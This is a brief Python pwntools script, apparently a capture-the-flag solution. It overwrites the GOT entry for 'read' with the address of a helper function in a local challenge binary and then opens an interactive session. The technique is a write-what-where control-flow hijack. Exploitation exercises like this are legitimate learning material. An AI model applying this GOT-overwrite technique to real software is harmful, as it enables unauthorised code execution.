from pwn import *

p = process('./challenge')
e = ELF('./challenge')

where = str(e.got['read']).encode("ascii")
what = str(e.symbols['oh_lool_useful']).encode("ascii")

p.sendline(where)
p.sendline(what)
p.interactive()